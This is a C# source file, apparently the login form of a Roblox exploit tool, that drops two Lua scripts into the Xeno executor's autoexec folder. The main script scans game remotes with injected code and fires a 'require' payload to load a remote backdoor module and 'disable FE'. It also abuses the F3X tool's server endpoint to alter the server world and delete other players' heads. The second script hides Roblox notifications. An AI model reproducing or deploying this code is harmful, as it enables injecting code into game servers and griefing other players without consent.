using System;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Rc7
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        private static extern IntPtr SendMessage(IntPtr hWnd, int msg, IntPtr wParam, ref RECT lParam);

        private const int EM_SETRECT = 0x00B3;

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        private int ExtraPadding = 6;
        private string _realUsername = "";
        private string _realPassword = "";
        private bool _updating = false;

        private static readonly string AutoexecPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Xeno", "autoexec");

        private const string ScriptF3X = @"local player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local runService = game:GetService(""RunService"")
local Lighting = game:GetService(""Lighting"")

local f3xBypassSuccess = false
local feDisablerExecuted = false


local function FEDisabler()
    wait(1.5)
    
    print(""[FE Disabler] Starting backdoor scanner..."")
    
    local ReplicatedFirst = game:GetService(""ReplicatedFirst"")
    
    local detectedRemotes = {}
    local detectionComplete = false
    local vulnerableRemote = nil
    local scanDuration = 0
    
    local function isRemoteObject(instance)
        return instance:IsA(""RemoteEvent"") or instance:IsA(""RemoteFunction"")
    end
    
    local function collectAllRemotes()
        local remoteList = {}
        local seenRemotes = {}
        
        local function addRemote(remote)
            if not seenRemotes[remote] then
                seenRemotes[remote] = true
                table.insert(remoteList, remote)
            end
        end
        
        pcall(function()
            for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
                if isRemoteObject(obj) then
                    addRemote(obj)
                end
            end
        end)
        
        pcall(function()
            for _, obj in ipairs(ReplicatedFirst:GetDescendants()) do
                if isRemoteObject(obj) then
                    addRemote(obj)
                end
            end
        end)
        
        pcall(function()
            for _, obj in ipairs(ReplicatedStorage:GetChildren()) do
                if isRemoteObject(obj) then
                    addRemote(obj)
                end
            end
        end)
        
        pcall(function()
            for _, obj in ipairs(ReplicatedFirst:GetChildren()) do
                if isRemoteObject(obj) then
                    addRemote(obj)
                end
            end
        end)
        
        return remoteList
    end
    
    local function executeOnRemote(remote, payload)
        local success = pcall(function()
            if remote:IsA(""RemoteEvent"") then
                remote:FireServer(payload)
            elseif remote:IsA(""RemoteFunction"") then
                remote:InvokeServer(payload)
            end
        end)
        return success
    end
    
    local function remote_test(remote)
        if detectionComplete then return false end
        
        local testId = ""T_"" .. tostring(math.random(10000, 99999)) .. ""_"" .. tostring(os.clock()):gsub(""%."", """")
        local detected = false
        
        local connection = workspace.ChildAdded:Connect(function(child)
            if child.Name == testId then
                detected = true
            end
        end)
        
        local testPayload = ('Instance.new(""Model"", workspace).Name = ""%s""'):format(testId)
        
        pcall(function()
            if remote:IsA(""RemoteEvent"") then
                remote:FireServer(testPayload)
            elseif remote:IsA(""RemoteFunction"") then
                remote:InvokeServer(testPayload)
            end
        end)
        
        local timeout = 2
        local startTime = os.clock()
        while os.clock() - startTime < timeout do
            if detected or workspace:FindFirstChild(testId) then
                detected = true
                break
            end
            wait(0.01)
        end
        
        connection:Disconnect()
        
        local testObject = workspace:FindFirstChild(testId)
        if testObject then testObject:Destroy() end
        
        if detected and not detectionComplete then
            detectionComplete = true
            vulnerableRemote = remote
            return true
        end
        
        return false
    end
    
    local function remote_scan()
        local startTime = os.clock()
        detectionComplete = false
        vulnerableRemote = nil
        
        local allRemotes = collectAllRemotes()
        
        print(""[FE Disabler] Found remotes: "" .. #allRemotes)
        for _, remote in ipairs(allRemotes) do
            print(""[FE Disabler] Testing: "" .. remote:GetFullName())
        end
        
        local MAX_CONCURRENT = 50
        local activeTasks = 0
        local taskComplete = Instance.new(""BindableEvent"")
        
        for _, remote in ipairs(allRemotes) do
            if detectionComplete then break end
            
            while activeTasks >= MAX_CONCURRENT do
                taskComplete.Event:Wait()
            end
            
            activeTasks = activeTasks + 1
            spawn(function()
                pcall(function()
                    remote_test(remote)
                end)
                activeTasks = activeTasks - 1
                taskComplete:Fire()
            end)
        end
        
        while activeTasks > 0 and not detectionComplete do
            taskComplete.Event:Wait()
        end
        
        scanDuration = os.clock() - startTime
        return vulnerableRemote
    end
    
    pcall(function()
        if ReplicatedStorage:FindFirstChild(""FD"") or ReplicatedStorage:FindFirstChild(""FD2"") then
            print(""[FE Disabler] FE is already disabled in this server"")
            return
        end
    
        vulnerableRemote = remote_scan()
    
        if vulnerableRemote then
            print(""[FE Disabler] VULNERABLE REMOTE FOUND: "" .. vulnerableRemote:GetFullName())
            local injectPayload = 'require(71212999487669)'
            executeOnRemote(vulnerableRemote, injectPayload)
            
            wait(3)
            
            if ReplicatedStorage:FindFirstChild(""FD"") or ReplicatedStorage:FindFirstChild(""FD2"") then
                print(""[FE Disabler] FE has been removed from server via backdoor!"")
            else
                print(""[FE Disabler] Backdoor injection may not have worked"")
            end
        else
            print(""[FE Disabler] No vulnerable remote found"")
            
            local allRemotes = collectAllRemotes()
            print(""[FE Disabler] Trying all remotes with require payload..."")
            for _, remote in ipairs(allRemotes) do
                pcall(function()
                    local injectPayload = 'require(71212999487669)'
                    if remote:IsA(""RemoteEvent"") then
                        remote:FireServer(injectPayload)
                    elseif remote:IsA(""RemoteFunction"") then
                        remote:InvokeServer(injectPayload)
                    end
                end)
            end
            
            wait(3)
            
            if ReplicatedStorage:FindFirstChild(""FD"") or ReplicatedStorage:FindFirstChild(""FD2"") then
                print(""[FE Disabler] FE disabled via brute force!"")
            else
                print(""[FE Disabler] Could not disable FE"")
            end
        end
    end)
end


local function Main()
    local char = player.Character or player.CharacterAdded:Wait()
    local hum = char:WaitForChild(""Humanoid"")
    
    task.spawn(function()
        local hd = ReplicatedStorage:FindFirstChild(""HDAdmin"") or ReplicatedStorage:FindFirstChild(""HDAdminHDClient"")
        if hd then
            local signals = hd:FindFirstChild(""Signals"") or (hd:FindFirstChild(""HDClient"") and hd.HDClient:FindFirstChild(""Signals""))
            local req = signals and signals:FindFirstChild(""RequestCommandSilent"")
            if req then 
                pcall(function() req:InvokeServer("";invisible me"") end)
            end
        end
    end)

    local tool
    for i,v in player:GetDescendants() do
        if v.Name == ""SyncAPI"" then
            tool = v.Parent
        end
    end
    for i,v in ReplicatedStorage:GetDescendants() do
        if v.Name == ""SyncAPI"" then
            tool = v.Parent
        end
    end

    if not tool then
        print(""[F3X] SyncAPI not found - FE Bypass FAILED"")
        f3xBypassSuccess = false
        if not feDisablerExecuted then
            feDisablerExecuted = true
            task.spawn(FEDisabler)
        end
        return
    end

    print(""[F3X] SyncAPI found - FE Bypass SUCCESS"")
    f3xBypassSuccess = true

    local remote = tool.SyncAPI.ServerEndpoint

    function _(args)
        remote:InvokeServer(unpack(args))
    end

    function CreatePart(cf, parent)
        local args = {
            [1] = ""CreatePart"",
            [2] = ""Normal"",
            [3] = cf,
            [4] = parent
        }
        _(args)
    end

    function DestroyPart(part)
        local args = {
            [1] = ""Remove"",
            [2] = {
                [1] = part
            }
        }
        _(args)
    end

    function SetName(part, name)
        local args = {
            [1] = ""SetName"",
            [2] = {
                [1] = part
            },
            [3] = name
        }
        _(args)
    end

    function AddMesh(part)
        local args = {
            [1] = ""CreateMeshes"",
            [2] = {
                [1] = {
                    [""Part""] = part
                }
            }
        }
        _(args)
    end

    function SetMesh(part, meshid)
        local args = {
            [1] = ""SyncMesh"",
            [2] = {
                [1] = {
                    [""Part""] = part,
                    [""MeshId""] = ""rbxassetid://""..meshid
                }
            }
        }
        _(args)
    end

    function SetTexture(part, texid)
        local args = {
            [1] = ""SyncMesh"",
            [2] = {
                [1] = {
                    [""Part""] = part,
                    [""TextureId""] = texid
                }
            }
        }
        _(args)
    end

    function MeshResize(part, size)
        local args = {
            [1] = ""SyncMesh"",
            [2] = {
                [1] = {
                    [""Part""] = part,
                    [""Scale""] = size
                }
            }
        }
        _(args)
    end

    function SetLocked(part, locked)
        local args = {
            [1] = ""SetLocked"",
            [2] = {
                [1] = part
            },
            [3] = locked
        }
        _(args)
    end

    function SyncTexture(part, face, asset, textureType)
        local args = {
            [1] = ""SyncTexture"",
            [2] = {
                [1] = {
                    [""Part""] = part,
                    [""Face""] = face,
                    [""TextureType""] = textureType or ""Decal"",
                    [""Texture""] = asset
                }
            }
        }
        _(args)
    end

    function CreateTexture(part, face, textureType)
        local args = {
            [1] = ""CreateTextures"",
            [2] = {
                [1] = {
                    [""Part""] = part,
                    [""Face""] = face,
                    [""TextureType""] = textureType or ""Decal""
                }
            }
        }
        _(args)
    end

    function SyncMeshFull(part, meshType, scale, meshId, textureId)
        local args = {
            [1] = ""SyncMesh"",
            [2] = {
                [1] = {
                    [""Part""] = part,
                    [""MeshType""] = meshType,
                    [""Scale""] = scale,
                    [""MeshId""] = meshId,
                    [""TextureId""] = textureId
                }
            }
        }
        _(args)
    end

    local function CreateF3XSkybox(textureId)
        if not textureId then return end
        
        for _,v in workspace:GetDescendants() do
            if v:IsA(""BasePart"") and v.Name == ""Sky"" then
                DestroyPart(v)
            end
        end

        local root = char and char:FindFirstChild(""HumanoidRootPart"")
        if not root then return end
        local e = root.CFrame.X
        local f = root.CFrame.Y
        local g = root.CFrame.Z

        CreatePart(CFrame.new(math.floor(e), math.floor(f), math.floor(g)) + Vector3.new(0, 6, 0), workspace)

        for i,v in workspace:GetDescendants() do
            if v:IsA(""BasePart"") and v.CFrame.X == math.floor(e) and v.CFrame.Z == math.floor(g) and v.Name ~= ""Sky"" then
                SetName(v, ""Sky"")
                AddMesh(v)
                SetMesh(v, ""111891702759441"")
                SetTexture(v, textureId)
                MeshResize(v, Vector3.new(10000, 10000, 10000))
                SetLocked(v, true)
                
                createdObjects[v] = true
                break
            end
        end
    end

    Lighting.ChildAdded:Connect(function(child)
        if child:IsA(""Sky"") then
            task.wait(0.1)
            local textureId = child.SkyboxBk
            if textureId and textureId ~= """" then
                textureId = string.gsub(textureId, ""rbxassetid://"", """")
                CreateF3XSkybox(textureId)
            end
        end
    end)

    local partMap = {}
    local lastCF = {}
    _G.F3X_SyncActive = true

    local createdObjects = {}

    local function IsOtherCharacterPart(part)
        local model = part:FindFirstAncestorOfClass(""Model"")
        if model and model:FindFirstChild(""Humanoid"") then
            if model ~= char then
                return true
            end
        end
        return false
    end

    local function IsSkyboxPart(part)
        return part.Name == ""Sky"" and part:FindFirstChildOfClass(""SpecialMesh"") ~= nil
    end

    local function GetSkyboxTextureId(part)
        local mesh = part:FindFirstChildOfClass(""SpecialMesh"")
        if mesh and mesh.TextureId ~= """" then
            return mesh.TextureId
        end
        return nil
    end

    local function CreateLightingSkybox(textureId)
        if not textureId then return end
        
        for _, oldSky in ipairs(Lighting:GetChildren()) do
            if oldSky:IsA(""Sky"") then
                oldSky:Destroy()
            end
        end
        
        local SkyBox = Instance.new(""Sky"")
        SkyBox.Name = ""Plus""
        SkyBox.Parent = Lighting
        SkyBox.SkyboxBk = textureId
        SkyBox.SkyboxDn = textureId
        SkyBox.SkyboxFt = textureId
        SkyBox.SkyboxRt = textureId
        SkyBox.SkyboxLf = textureId
        SkyBox.SkyboxUp = textureId
        SkyBox.StarCount = 0
    end

    local function TrackTextureAndMeshChanges(real)
        if createdObjects[real] then
            return
        end
        
        if not real:IsA(""BasePart"") then
            return
        end

        for _, v in pairs(real:GetChildren()) do
            if v:IsA(""Decal"") or v:IsA(""Texture"") then
                local function syncTexture()
                    pcall(function()
                        CreateTexture(real, v.Face, v.ClassName)
                        SyncTexture(real, v.Face, v.Texture, v.ClassName)
                    end)
                end
                v:GetPropertyChangedSignal(""Texture""):Connect(syncTexture)
                v:GetPropertyChangedSignal(""Face""):Connect(syncTexture)
            end
        end

        for _, v in pairs(real:GetChildren()) do
            if v:IsA(""SpecialMesh"") then
                local function syncMesh()
                    pcall(function()
                        SyncMeshFull(real, v.MeshType, v.Scale, v.MeshId, v.TextureId)
                    end)
                end
                v:GetPropertyChangedSignal(""MeshId""):Connect(syncMesh)
                v:GetPropertyChangedSignal(""TextureId""):Connect(syncMesh)
                v:GetPropertyChangedSignal(""Scale""):Connect(syncMesh)
            end
        end

        real.ChildAdded:Connect(function(child)
            if child:IsA(""Decal"") or child:IsA(""Texture"") then
                pcall(function()
                    CreateTexture(real, child.Face, child.ClassName)
                    SyncTexture(real, child.Face, child.Texture, child.ClassName)
                end)
            elseif child:IsA(""SpecialMesh"") then
                pcall(function()
                    AddMesh(real)
                    SyncMeshFull(real, child.MeshType, child.Scale, child.MeshId, child.TextureId)
                end)
            end
        end)
    end

    local function SyncBodyPart(real)
        if createdObjects[real] then
            return
        end
        
        if not real:IsA(""BasePart"") or real.Name == ""HumanoidRootPart"" then
            return
        end

        if IsOtherCharacterPart(real) then
            return
        end

        local visible = false
        if real.Transparency < 1 then
            visible = true
        end
        for _, v in pairs(real:GetDescendants()) do
            if v:IsA(""Decal"") or v:IsA(""Texture"") then
                if v.Transparency < 1 and v.Texture ~= """" then
                    visible = true
                    break
                end
            elseif v:IsA(""SpecialMesh"") then
                if v.TextureId ~= """" or v.MeshId ~= """" then
                    visible = true
                end
            end
        end
        if not visible then return end

        local syncTag = Instance.new(""BoolValue"", real)
        syncTag.Name = ""F3X_Synced""

        task.spawn(function()
            local success, fake = pcall(function() return remote:InvokeServer(""CreatePart"", ""Normal"", real.CFrame, workspace) end)
            if success and fake then
                partMap[real] = fake
                createdObjects[fake] = true
                
                remote:InvokeServer(""SyncAnchor"", {{Part = fake, Anchored = true}})
                remote:InvokeServer(""SyncCollision"", {{Part = fake, CanCollide = false}})
                remote:InvokeServer(""SyncMaterial"", {{Part = fake, Material = real.Material}})
                remote:InvokeServer(""SyncColor"", {{Part = fake, Color = real.Color, Transparency = real.Transparency}})
                remote:InvokeServer(""SyncResize"", {{Part = fake, Size = real.Size, CFrame = real.CFrame}})

                for _, v in pairs(real:GetChildren()) do
                    if v:IsA(""Decal"") or v:IsA(""Texture"") then
                        pcall(function()
                            CreateTexture(fake, v.Face, v.ClassName)
                            SyncTexture(fake, v.Face, v.Texture, v.ClassName)
                        end)
                    elseif v:IsA(""SpecialMesh"") then
                        pcall(function()
                            AddMesh(fake)
                            SyncMeshFull(fake, v.MeshType, v.Scale, v.MeshId, v.TextureId)
                        end)
                    end
                end

                TrackTextureAndMeshChanges(real)

                real.LocalTransparencyModifier = 1
                for _, v in pairs(real:GetDescendants()) do if v:IsA(""BasePart"") or v:IsA(""Decal"") then v.LocalTransparencyModifier = 1 end end

                real.AncestryChanged:Connect(function(_, p) if not p then remote:InvokeServer(""RemoveObjects"", {fake}) end end)
            end
        end)
    end

    for _, v in pairs(char:GetDescendants()) do SyncBodyPart(v) end

    char.DescendantAdded:Connect(function(desc)
        if createdObjects[desc] then
            return
        end
        if desc:FindFirstChild(""F3X_Synced"") then
            return
        end
        if desc:IsA(""BasePart"") then
            SyncBodyPart(desc)
        end
    end)

    workspace.DescendantAdded:Connect(function(desc)
        task.defer(function()
            if createdObjects[desc] then
                return
            end
            if desc:FindFirstChild(""F3X_Synced"") then
                return
            end
            if IsOtherCharacterPart(desc) then
                return
            end
            
            if IsSkyboxPart(desc) then
                local textureId = GetSkyboxTextureId(desc)
                if textureId then
                    CreateLightingSkybox(textureId)
                end
            end
            
            if desc:IsA(""BasePart"") then
                SyncBodyPart(desc)
            end
        end)
    end)

    local lastCF = {}
    local sendRate = 1/30
    local nextSend = 0

    local movingParts = {}
    local movingCount = 0

    _G.F3X_MoveLoop = runService.RenderStepped:Connect(function()
        local now = tick()
        if now < nextSend then return end
        nextSend = now + sendRate

        table.clear(movingParts)
        movingCount = 0

        for real, fake in next, partMap do
            if real.Parent and fake.Parent then
                local cf = real.CFrame
                local old = lastCF[real]
                if not old or (old.Position - cf.Position).Magnitude > 0.01 or (old.LookVector - cf.LookVector).Magnitude > 0.01 then
                    lastCF[real] = cf
                    movingCount += 1
                    movingParts[movingCount] = {Part = fake, CFrame = cf}
                end
            else
                partMap[real] = nil
                lastCF[real] = nil
            end
        end

        if movingCount > 0 then
            remote:InvokeServer(""SyncMove"", movingParts)
        end
    end)

    function DestroyPart(part)
        local args = {
            [1] = ""Remove"",
            [2] = {
                [1] = part
            }
        }
        _(args)
    end

    function DestroyHead(targetPlayer)
        if targetPlayer.Character and targetPlayer.Character:FindFirstChild(""Head"") then
            DestroyPart(targetPlayer.Character.Head)
        end
    end

    local lastHealth = {}

    _G.F3X_HealthCheck = runService.Heartbeat:Connect(function()
        for _, plr in ipairs(game.Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild(""Humanoid"") then
                local humanoid = plr.Character.Humanoid
                local currentHealth = humanoid.Health
                
                if lastHealth[plr] and lastHealth[plr] > currentHealth then
                    DestroyHead(plr)
                end
                
                lastHealth[plr] = currentHealth
            else
                lastHealth[plr] = nil
            end
        end
    end)

    for _, plr in ipairs(game.Players:GetPlayers()) do
        if plr.Character and plr.Character:FindFirstChild(""Humanoid"") then
            lastHealth[plr] = plr.Character.Humanoid.Health
        end
    end

    hum.Died:Connect(function()
        if _G.F3X_MoveLoop then
            _G.F3X_MoveLoop:Disconnect()
            _G.F3X_MoveLoop = nil
        end
        if _G.F3X_HealthCheck then
            _G.F3X_HealthCheck:Disconnect()
            _G.F3X_HealthCheck = nil
        end
        
        local removePacket = {}
        for real, fake in pairs(partMap) do
            if fake and fake.Parent then
                removePacket[#removePacket + 1] = fake
            end
        end
        if #removePacket > 0 then
            pcall(function() remote:InvokeServer(""RemoveObjects"", removePacket) end)
        end
        table.clear(partMap)
        if lastCF then table.clear(lastCF) end
        
        player.CharacterAdded:Wait()
        Main()
    end)
end


Main()
";

        private const string ScriptDisableXenoNotif = @"local coreGui = game:GetService(""CoreGui"")
local robloxGui = coreGui:FindFirstChild(""RobloxGui"")
if robloxGui then
    local notificationFrame = robloxGui:FindFirstChild(""NotificationFrame"")
    local startTime = tick()
    local timeout = 5
    while not notificationFrame or #notificationFrame:GetChildren() == 0 do
        task.wait(0.1)
        notificationFrame = robloxGui:FindFirstChild(""NotificationFrame"")
        if tick() - startTime > timeout then break end
    end
    if notificationFrame then
        for _, child in ipairs(notificationFrame:GetChildren()) do
            if child:IsA(""Frame"") and child.Visible then
                child.Visible = false
                child.Active = false
                break
            end
        end
    end
end
";

        public Form1()
        {
            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.MinimizeBox = true;
            this.TopMost = true;

            try { this.Icon = Icon.ExtractAssociatedIcon(Application.ExecutablePath); }
            catch { }

            this.Load += Form1_Load;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "theme", "MainUiLogin.bmp");
                if (File.Exists(path))
                {
                    this.BackgroundImage = Image.FromFile(path);
                    this.BackgroundImageLayout = ImageLayout.Stretch;
                }
                else this.BackColor = Color.Black;
            }
            catch { this.BackColor = Color.Black; }

            lblLoginButton.Click += (s, ev) =>
            {
                this.DialogResult = DialogResult.OK;
            };

            CleanAutoexecFolder();
            CreateAutoexecScripts();

            txtUsername.TextChanged += (s, ev) => Reformat(txtUsername, false);
            txtPassword.TextChanged += (s, ev) => Reformat(txtPassword, true);
            txtUsername.SizeChanged += (s, ev) => Reformat(txtUsername, false);
            txtPassword.SizeChanged += (s, ev) => Reformat(txtPassword, true);
            txtUsername.KeyDown += (s, ev) => { if (ev.KeyCode == Keys.Enter) ev.SuppressKeyPress = true; };
            txtPassword.KeyDown += (s, ev) => { if (ev.KeyCode == Keys.Enter) ev.SuppressKeyPress = true; };

            Reformat(txtUsername, false);
            Reformat(txtPassword, true);

            CenterVertically(txtUsername);
            CenterVertically(txtPassword);
        }

        public static void CleanAutoexecFolder()
        {
            try
            {
                if (!Directory.Exists(AutoexecPath))
                {
                    Directory.CreateDirectory(AutoexecPath);
                    return;
                }

                foreach (string file in Directory.GetFiles(AutoexecPath))
                {
                    try { File.Delete(file); } catch { }
                }
            }
            catch { }
        }

        private static void CreateAutoexecScripts()
        {
            try
            {
                if (!Directory.Exists(AutoexecPath))
                    Directory.CreateDirectory(AutoexecPath);

                File.WriteAllText(Path.Combine(AutoexecPath, "FEDisabler.lua"), ScriptF3X);
                File.WriteAllText(Path.Combine(AutoexecPath, "disablexenonotif.lua"), ScriptDisableXenoNotif);
            }
            catch { }
        }

        private void Reformat(RichTextBox tb, bool isPassword)
        {
            if (_updating) return;
            _updating = true;
            try
            {
                string current = tb.Text.TrimStart(' ');
                if (isPassword) _realPassword = current; else _realUsername = current;
                string display = isPassword ? new string('•', current.Length) : current;

                Size textSize = TextRenderer.MeasureText(display, tb.Font);
                Size spaceSize = TextRenderer.MeasureText(" ", tb.Font);
                int spaceWidth = spaceSize.Width;
                if (spaceWidth <= 0) spaceWidth = 6;

                int paddingPixels = (tb.ClientSize.Width - textSize.Width) / 2;
                if (paddingPixels < 0) paddingPixels = 0;

                int paddingChars = (paddingPixels / spaceWidth) + ExtraPadding;
                if (paddingChars < 0) paddingChars = 0;

                tb.Text = new string(' ', paddingChars) + display;
                tb.SelectionStart = tb.Text.Length;
            }
            finally { _updating = false; }
        }

        private void CenterVertically(RichTextBox tb)
        {
            Size textSize = TextRenderer.MeasureText("A", tb.Font);
            int vPad = (tb.ClientSize.Height - textSize.Height) / 2;
            if (vPad < 0) vPad = 0;

            RECT rect = new RECT
            {
                Left = 0,
                Top = vPad,
                Right = tb.ClientSize.Width,
                Bottom = tb.ClientSize.Height
            };
            SendMessage(tb.Handle, EM_SETRECT, IntPtr.Zero, ref rect);
        }
    }
}